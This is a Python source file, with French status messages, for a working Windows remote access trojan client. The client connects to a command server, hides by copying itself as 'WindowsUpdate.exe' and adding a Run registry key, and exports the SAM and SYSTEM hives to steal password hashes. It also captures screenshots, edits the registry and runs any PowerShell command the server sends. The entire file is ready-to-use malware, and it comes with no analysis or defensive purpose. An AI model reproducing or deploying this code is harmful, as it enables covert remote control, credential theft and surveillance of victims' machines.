import socket
import subprocess
import os
import sys
import base64
import time
import shutil
import winreg
import mss

SERVER_IP = "127.0.0.1" 
SERVER_PORT = 4444
BUFFER = 4096

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def setup_persistence():
    try:
        dest = os.path.join(os.environ["APPDATA"], "WindowsUpdate.exe")
        if not os.path.exists(dest):
            shutil.copy2(sys.argv[0], dest)
        clef = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(clef, "WindowsUpdate", 0, winreg.REG_SZ, dest)
        winreg.CloseKey(clef)
        return "Persistance activee"
    except Exception as e:
        return f"Erreur persistance: {e}"

def add_registry_key(chemin, nom, valeur):
    try:
        clef = winreg.OpenKey(winreg.HKEY_CURRENT_USER, chemin, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(clef, nom, 0, winreg.REG_SZ, valeur)
        winreg.CloseKey(clef)
        return f"Clef ajoutee: {chemin}\\{nom} = {valeur}"
    except Exception as e:
        return f"Erreur registre: {e}"

def dump_sam():
    try:
        subprocess.run(["reg", "save", "HKLM\\SAM", "sam.hive", "/y"], capture_output=True, check=True)
        subprocess.run(["reg", "save", "HKLM\\SYSTEM", "system.hive", "/y"], capture_output=True, check=True)
        with open("sam.hive", "rb") as f: sam = base64.b64encode(f.read()).decode()
        with open("system.hive", "rb") as f: system = base64.b64encode(f.read()).decode()
        os.remove("sam.hive"); os.remove("system.hive")
        return f"SAM:{sam}\nSYSTEM:{system}"
    except Exception as e:
        for fic in ["sam.hive", "system.hive"]:
            if os.path.exists(fic): os.remove(fic)
        return f"Erreur SAM: {e}"

def take_screenshot():
    try:
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[1])
            return mss.tools.to_png(img.rgb, img.size)
    except Exception as e:
        return f"Erreur screenshot: {e}".encode()

def execute_cmd(cmd):
    if os.name == 'nt':
        res = subprocess.run(["powershell", "-Command", cmd], capture_output=True, text=True, errors="replace")
    else:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return res.stdout + res.stderr

def main():
    print(f"[*] Client demarre - IP: {get_ip()}")
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            print(f"[+] Connecte a {SERVER_IP}:{SERVER_PORT}")
            sock.send(f"{socket.gethostname()} - {get_ip()}".encode())

            while True:
                commande = sock.recv(BUFFER).decode("utf-8").strip()
                if not commande: break
                if commande == "exit":
                    sock.close(); return
                elif commande == "persistance":
                    sock.send(setup_persistence().encode())
                elif commande.startswith("regedit "):
                    parts = commande.split(" ", 3)
                    if len(parts) == 4:
                        sock.send(add_registry_key(parts[1], parts[2], parts[3]).encode())
                    else:
                        sock.send(b"Usage: regedit CHEMIN NOM VALEUR")
                elif commande == "sam":
                    sock.sendall(dump_sam().encode())
                elif commande == "screenshot":
                    sock.sendall(take_screenshot())
                else:
                    sock.send(execute_cmd(commande).encode())
        except Exception as e:
            print(f"[!] Erreur: {e}")
            try: sock.close()
            except: pass
            print("[*] Reconnexion dans 5s...")
            time.sleep(5)

if __name__ == "__main__":
    main()